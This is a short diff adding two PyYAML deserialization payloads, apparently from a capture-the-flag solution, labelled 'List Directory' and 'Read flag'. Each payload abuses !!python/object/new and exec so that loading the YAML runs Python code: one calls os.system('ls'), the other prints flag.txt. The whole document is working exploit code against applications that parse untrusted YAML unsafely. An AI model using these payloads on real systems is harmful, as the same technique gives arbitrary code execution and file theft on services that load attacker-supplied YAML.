@@ -1,0 +1,23 @@
+# List Directory
+
+!!python/object/new:str
+  args: []
+  state: !!python/tuple
+  - "import os;os.system('ls')"
+  - !!python/object/new:staticmethod
+    args: [0]
+    state:
+      update: !!python/name:exec
+
+
+# Read flag 
+
+!!python/object/new:str
+  args: []
+  state: !!python/tuple
+  - "print(open('flag.txt').read())"
+  - !!python/object/new:staticmethod
+    args: [0]
+    state:
+      update: !!python/name:exec
+
